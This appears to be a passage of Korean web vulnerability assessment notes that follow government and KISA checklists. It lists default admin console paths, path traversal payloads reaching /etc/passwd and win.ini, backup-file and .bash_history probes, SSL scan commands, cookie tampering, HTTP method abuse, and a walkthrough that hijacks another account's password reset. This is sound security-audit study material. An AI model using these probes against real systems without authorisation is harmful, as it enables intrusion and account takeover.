		- url 뒷단에 /admin/main.asp, /admin/menu.html, /adm, /mgr, /manager 등 추가해서 이동요청해보기
			그 외 추측 가능한 관리자페이지 (/webmaster, /administrator, /master, /system 등)


		- 톰캣(Tomcat)			도메인명/manager/html
								도메인명:8080/manager/html
								
		- 웹로직(WebLogic)		도메인명:7001/console
		
		- 웹스피어(Websphere)		도메인명:7090/admin
								도메인명:9090/admin
								도메인명:9043/admin
								
		- 레진(resin)			도메인명:8080/resin-admin
		
		- 제우스(JEUS)			도메인명/webadmin

		- http://IP 주소(입력)/robots.txt 에서 관리자페이지 경로 노출 여부 체크

25. 경로추적 (24년도 행안부 개선내용에서 삭제될 예정)

		- 공격자에게 외부에서 디렉터리에 접근할 수 있는 것이 허가되는 문제점으로 웹 루트 디렉터리에서 외부의 파일까지 접근하고 실행할 수 있는 취약점

		- 파일 다운로드의 filePath 경로에 임의의 파일 조회 시 접근이 가능한 것을 확인.

		[공격가능한 기법]
		../../../../../../../../../../../../etc/passwd
		../../../../../../../../../../../../winnt/win.ini
		../../../../../../../../../../../../boot.ini

26. 위치공개 (24년도 행안부 개선내용에서 삭제될 예정)

		- 예측 가능한 디렉터리나 파일명을 사용하여 해당 위치가 쉽게 노출되어 공격자가 이를 악용하여 대상에 대한 정보와 민감한 정보가 담긴 데이터에 접근이 가능하게 되는 취약점

		- .bak, .backup, .org, .old, .zip, .log, .sql, .new, .txt, .tmp, .temp 확장자의 불필요한 파일 존재 확인
		
		- cgi-bin , manual, usage, iissamples, scripts, iisHelp, IISAdmin, _vit_bin, Printers, phpinfo.php, examples, jsp, servlets 의 디렉터리 및 파일 존재여부 확인

	★	- 웹 루트 디렉터리 내 웹 서비스에 불필요한 확장자(.bak, .backup, .org, .old, .zip, .log, .sql, .new, .txt, .tmp, .temp) 파일이 존재하는지 확인
		/test.asp .php .jsp   .bak
		/index.asp .jsp       .bak
		/bbs.zip
		/phpinfo.php
		/admin/index.html(asp, jsp, php)
		/adm/login.html
		/manager/default.htm
		/board/admin
		/admin/index.html
		
		ex)
		http://IP_ADDR/phpinfo.php 
		http://IP_ADDR/test.php 
		http://IP_ADDR/.bash_history 

27. 데이터 평문전송

		- 서버와 클라이언트간 통신 시 암호화하여 전송을 하지 않아 중요 정보 등이 평문으로 전송되는 취약점

		[공격가능한 기법]
		- https 적용 여부 확인

		- 툴 점검 확인
		https 사용시 wireshark 를 통해서 ssl 버전확인. (TLS 1.3 이상 최신 버전)
					SSL(오픈 웹 페이지) 을 통해서 ssl 버전확인. (TLS 1.3 이상 최신 버전)

		- SSL 테스트 
			SSL 체크 (칼리 리눅스에 기본 설치된 sslscan 툴 이용)
			sslscan -h 옵션 설명
			sslscan -noheartbleed [IP OR TARGET HOST]

			openssl s_client -connect 127.0.0.1:443 -tls1_1

		- burp suite +  SSL Scaner 추가

28.	쿠키변조 (24년도 행안부 개선내용에서 변경될 예정)

		- 적절히 보호되지 않은 쿠키를 사용하여 쿠키 인젝션 등과 같은 쿠키 값 변조를 통한 다른 사용자로의 위장 및 권한 상승 등이 가능한 취약점

		[공격가능한 기법]
		- 웹 브라우저 주소 창에 javascript:document.cookie; 를 입력하여 쿠키 내용이 암호화되었는지 여부를 확인

		- 쿠키 내용 및 발행되는 쿠키에 중요 정보(인증을 위한 ID, 권한을 위한 구분자 등)의 노출 여부 조사

		- 쿠키의 중요 정보를 변경하여 다른 사용자 및 권한으로 정상적 이용이 가능한지 확인

		- 브라우저에서 HttpOnly 의 기능 활성화 여부 체크, https 의 경우 secure 의 기능 활성화 여부 체크(권고 정도로 기재하면 좋음)

××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××

<< 4-2. 취약점 진단 참고 #KISA 21종 >>

1. 운영체제 명령 실행 
	- 행안부 동일
	
2. SQL 인젝션
	- 행안부 동일
	
3. XPath 인젝션
	- 행안부 동일
	
4. 디렉토리 인덱싱
	- 행안부 동일
	
5. 정보누출
	- 행안부 동일
	
6. 악성콘텐츠
	- 행안부 동일
	
7. 크로사이트 스크립팅(XSS)
	- 행안부 동일
	
8. 약한 문자열 강도(브루트포스)
	- 행안부 동일
	
9. 불충분한 인증 및 인가
	- 행안부 동일
	
10. 취약한 패스워드 복구
	- 행안부 동일
	
11. 불충분한 세션 관리
	- 행안부 동일
	
12. 크로스사이트 리퀘스트 변조(CSRF)
	- 행안부 동일
	
13. 자동화공격
	- 행안부 동일
	
14. 파일업로드
	- 행안부 동일
	
15. 경로추적 및 파일다운로드
	- 행안부 동일
	
16. 관리자페이지 노출
	- 행안부 동일
	
17. 위치공개
	- 행안부 동일
	
18. 데이터 평문전송
	- 행안부 동일
	
19. 쿠키변조
	- 행안부 동일
	
20. 웹 서비스 메소드 설정 공격
	
	- 메서드는 웹 애플리케이션에서 기본적으로 제공되며 클라이언트와 통신하기 위한 명령어이다.
	- 웹 메소드는 POST, PUT, DELETE, TRACE 등 다양하게 존재한다
	
	[공격가능한 기법]
	- 일부 환경에서 HEAD메소드를 사용하여 파일업로드 취약점이 발견됨
	- 파일 업로드 환경에서 PUT메소드를 사용하여 파일을 변조 후 업로드가 가능할 수 있음
	- DELETE, MOVE메소드를 사용하여 홈페이지의 소스 파일을 이동, 삭제할 수 있음 

21. URL/파라미터 변조

	- URL, 파라미터의 값을 검증하지 않아 특정 사용자의 권한 획득이 가능한 취약점

	[공격가능한 기법]
		1) 비밀번호 찾기 기능을 통해서 계정의 비밀번호 찾기 버튼 클릭
		2) 해당 계정의 이메일 주소로 비밀번호 변경 안내 메일을 확인하고, 해당 메일에 존재하는 비밀번호 변경 버튼 선택 
		3) 비밀번호 변경 버튼 선택 결과 서버로 id와 변경할 비밀번호가 전송
		4) 서버로 id와 변경할 비밀번호를 전송할 때 해당 패킷을 가로채서 타 사용자의 id값을 입력하고, 원하는 비밀번호로 변경하여 서버로 전송
			- 기존 ID = mlcroi0069@securus.co.kr -> 변경 ID = mlcroi0069@gmail.com 
			- 기존 PW = 047 -> 변경 PW = 000000
		5) 변경된 패킷을 서버로 전송한 결과 비밀번호 변경이 완료
		6) 변경된 ID와 PW를 통해서 로그인이 가능


××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××
